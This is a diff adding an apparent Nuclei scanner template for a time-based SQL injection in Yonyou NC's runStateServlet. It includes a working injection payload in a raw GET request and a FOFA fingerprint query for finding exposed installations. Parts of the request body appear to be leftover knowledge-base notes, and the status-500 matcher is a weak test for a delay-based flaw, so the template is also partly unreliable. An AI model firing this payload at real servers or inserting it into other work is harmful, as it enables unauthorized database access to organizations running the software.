@@ -1,0 +1,37 @@
+id: poc-ucn260v2w98d4g7x
+info:
+  name: 用友NC runStateServlet SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ucn260v2w98d4g7x'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ucn260v2w98d4g7x
+    fofa: icon_hash="1085941792" && body="/logo/images/logo.gif"
+http:
+- raw:
+  - 'GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1''waitfor+delay+''0:0:5''-- HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
